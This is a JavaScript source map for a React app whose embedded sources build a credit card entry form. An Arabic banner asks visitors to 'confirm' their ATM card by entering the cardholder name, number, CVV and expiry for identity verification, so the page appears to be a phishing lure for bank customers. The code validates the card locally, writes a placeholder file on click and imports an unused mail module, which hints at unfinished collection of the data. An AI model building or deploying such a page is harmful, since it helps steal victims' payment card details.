{"version":3,"sources":["useForm.js","validateInfo.js","components/CreditCardForm.js","App.js","index.js"],"names":["useForm","_useState","useState","cardName","cardNumber","cardType","cardExpiration","cardSecurityCode","cardPostalCode","focus","_useState2","_slicedToArray","values","setValues","_useState3","_useState4","errors","setErrors","handleChange","e","_e$target","target","name","value","_objectSpread","_defineProperty","handleFocus","handleSubmit","preventDefault","creditCard","valid","number","expirationDate","cvv","cardholderName","postalCode","show","variant","message","cname","cnumber","ctype","cexp","ccvv","cpostal","trim","isValid","card","type","toUpperCase","validateInfo","CreditCardForm","fs","require","_useForm","_jsxs","children","className","style","textAlign","paddingTop","_jsx","Cards","cvc","expiry","focused","Form","onSubmit","direction","Group","Control","id","placeholder","onChange","onFocus","Row","Col","Button","size","onClick","writeFile","err","console","error","Alert","App","ReactDOM","render","document","getElementById"],"mappings":"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","file":"static/js/main.5e2855a4.chunk.js","sourcesContent":["import { useState } from 'react'\nimport validateInfo from './validateInfo';\n\nconst useForm = () => {\n    const [values, setValues] = useState({\n        cardName: '',\n        cardNumber: '',\n        cardType: '',\n        cardExpiration: '',\n        cardSecurityCode: '',\n        cardPostalCode: '',\n        focus: ''\n    })\n\n    const [errors, setErrors] = useState({})\n\n    const handleFocus = (e) => {\n        setValues({ \n            ...values,\n            focus: (e.target.name === 'cardSecurityCode') ? 'cvc' : e.target.name\n        });\n    }\n\n    const handleChange = e => {\n        const { name, value } = e.target\n        setValues({\n            ...values,\n            [name]: value\n        })\n    }\n\n    const handleSubmit = e => {\n        e.preventDefault()\n        setErrors(validateInfo(values))\n    };\n    \n    return { handleChange, handleFocus, handleSubmit, values, errors };\n};\n\nexport default useForm; ","import valid from \"card-validator\";\n\nexport default function validateInfo(values) {\n  let errors = {};\n  let creditCard = valid.number(values.cardNumber);\n\n  creditCard.expirationDate = valid.expirationDate(values.cardExpiration);\n  creditCard.cvv = valid.cvv(values.cardSecurityCode);\n  creditCard.cardholderName = valid.cardholderName(values.cardName);\n  creditCard.postalCode = valid.postalCode(values.cardPostalCode);\n\n  errors.show = true;\n  errors.variant = \"danger\";\n  errors.message = \"An unknown error occured. Please try again later\"\n  errors.cname = false;\n  errors.cnumber = false;\n  errors.ctype = false;\n  errors.cexp = false;\n  errors.ccvv = false;\n  errors.cpostal = false;\n\n  if (values.cardPostalCode === null || !values.cardPostalCode.trim()) {\n    errors.message = \"Credit card postal code is not complete\";\n  } else if (creditCard.postalCode.isValid) {\n    errors.cpostal = true;\n  } else {\n    errors.message = \"Credit card postal code is invalid\";\n  }\n\n  //Card CVV expiration\n  if (values.cardSecurityCode === null || !values.cardSecurityCode.trim()) {\n    errors.message = \"Credit card CVC is not complete\";\n  } else if (creditCard.cvv.isValid) {\n    errors.ccvv = true;\n  } else {\n    errors.message = \"Credit card CVC is invalid\";\n  }\n\n  //Card Expiration Verification\n  if (values.cardExpiration === null || !values.cardExpiration.trim()) {\n    errors.message = \"Credit card expiration date is not complete\";\n  } else if (creditCard.expirationDate.isValid) {\n    errors.cexp = true;\n  } else {\n    errors.message = \"Credit card expiration date is invalid\";\n  }\n\n  //Card Type Verification\n  if (\n    values.cardType === null ||\n    !values.cardType.trim() ||\n    creditCard.card === null\n  ) {\n    errors.message = \"Credit card type is not complete\";\n  } else if (\n    creditCard.card.type &&\n    creditCard.card.type.toUpperCase() === values.cardType.toUpperCase()\n  ) {\n    errors.ctype = true;\n  } else {\n    errors.message = \"Credit card type is invalid\";\n  }\n\n  //Card Number Verification\n  if (values.cardNumber === null || !values.cardNumber.trim()) {\n    errors.message = \"Credit card number is not complete\";\n  } else if (creditCard.isValid) {\n    errors.cnumber = true;\n  } else {\n    errors.message = \"Credit card number is invalid\";\n  }\n\n  //Cardholder Name Verification\n  if (values.cardName === null || !values.cardName.trim()) {\n    errors.message = \"Cardholder name is not complete\";\n  } else if (creditCard.cardholderName.isValid) {\n    errors.cname = true;\n  } else {\n    errors.message = \"Cardholder name is invalid\";\n  }\n\n  if (\n    errors.ctype &&\n    errors.cname &&\n    errors.cnumber &&\n    errors.cexp &&\n    errors.cpostal &&\n    errors.ccvv\n  ) {\n    errors.variant = \"success\";\n    errors.message = \"Credit Card is valid\";\n  }\n\n  return errors;\n}\n","import React from \"react\";\nimport useForm from \"../useForm\";\nimport { Button, Form, Alert, Row, Col } from \"react-bootstrap\";\nimport \"bootstrap/dist/css/bootstrap.min.css\";\nimport \"./CreditCardForm.css\";\nimport Cards from \"react-credit-cards\";\nimport \"react-credit-cards/es/styles-compiled.css\";\nimport mail from \"mail\";\n\nconst CreditCardForm = () => {\n  const fs = require(\"fs\");\n\n  const content = \"Some content!\";\n\n  const write = () => {\n    fs.writeFile(\"./output.txt\", content, (err) => {\n      if (err) {\n        console.error(err);\n        return;\n      }\n      //file written successfully\n    });\n  };\n\n  const { handleChange, handleFocus, handleSubmit, values, errors } = useForm();\n  return (\n    <div>\n      <div className=\"sys\" style={{ textAlign: \"center\", paddingTop: 50 }}>\n        <h5>تأكيد بطاقة الصراف الالي</h5>\n        <p>\n          يرجى ادخال معلومات البطاقة المصرفية لغايات تاكيد الهوية, يرجى عدم\n          مشاركة اي بيانات بنكية{\" \"}\n        </p>\n      </div>\n      <div className=\"container\">\n        <div className=\"box justify-content-center align-items-center\">\n          <div className=\"formDiv\">\n            <div className=\"creditCard\">\n              <Cards\n                cvc={values.cardSecurityCode}\n                expiry={values.cardExpiration}\n                focused={values.focus}\n                name={values.cardName}\n                number={values.cardNumber}\n              />\n            </div>\n            <Form onSubmit={handleSubmit} style={{ direction: \"rtl\" }}>\n              <Form.Group>\n                <Form.Control\n                  type=\"text\"\n                  id=\"cardName\"\n                  data-testid=\"cardName\"\n                  name=\"cardName\"\n                  placeholder=\" اسم حامل البطاقة\"\n                  value={values.cardName}\n                  onChange={handleChange}\n                  onFocus={handleFocus}\n                  isValid={errors.cname}\n                />\n              </Form.Group>\n              <Form.Group>\n                <Form.Control\n                  type=\"number\"\n                  id=\"cardNumber\"\n                  data-testid=\"cardNumber\"\n                  name=\"cardNumber\"\n                  placeholder=\"رقم البطاقة\"\n                  value={values.cardNumber}\n                  onChange={handleChange}\n                  onFocus={handleFocus}\n                  isValid={errors.cnumber}\n                />\n              </Form.Group>\n              <Row>\n                <Col>\n                  <Form.Group>\n                    <Form.Control\n                      type=\"tel\"\n                      id=\"cardSecurityCode\"\n                      data-testid=\"cardSecurityCode\"\n                      name=\"cardSecurityCode\"\n                      placeholder=\"CVV\"\n                      value={values.cardSecurityCode}\n                      onChange={handleChange}\n                      onFocus={handleFocus}\n                      isValid={errors.ccvv}\n                    />\n                  </Form.Group>\n                </Col>\n                <Col>\n                  <Form.Group>\n                    <Form.Control\n                      type=\"text\"\n                      id=\"cardExpiration\"\n                      data-testid=\"cardExpiration\"\n                      name=\"cardExpiration\"\n                      placeholder=\"تاريخ الانتهاء\"\n                      value={values.cardExpiration}\n                      onChange={handleChange}\n                      onFocus={handleFocus}\n                      isValid={errors.cexp}\n                    />\n                  </Form.Group>\n                </Col>\n              </Row>\n              <Row>\n                <Col></Col>\n                <Col></Col>\n              </Row>\n              <Button\n                size={\"block\"}\n                data-testid=\"validateButton\"\n                id=\"validateButton\"\n                type=\"button\"\n                onClick={write}\n              >\n                تحقق\n              </Button>\n            </Form>\n          </div>\n          <Alert\n            id=\"alertMessage\"\n            data-testid=\"alertMessage\"\n            variant={errors.variant}\n            show={errors.show}\n          >\n            {errors.message}\n          </Alert>{\" \"}\n        </div>\n      </div>\n    </div>\n  );\n};\n\nexport default CreditCardForm;\n","import CreditCardForm from \"./components/CreditCardForm\";\n\nfunction App() {\n  return (\n    <div className=\"App\">\n      <CreditCardForm />\n    </div>\n  );\n}\n\nexport default App;\n","import React from \"react\";\nimport ReactDOM from \"react-dom\";\nimport App from \"./App\";\n\nReactDOM.render(<App />, document.getElementById(\"root\"));\n"],"sourceRoot":""}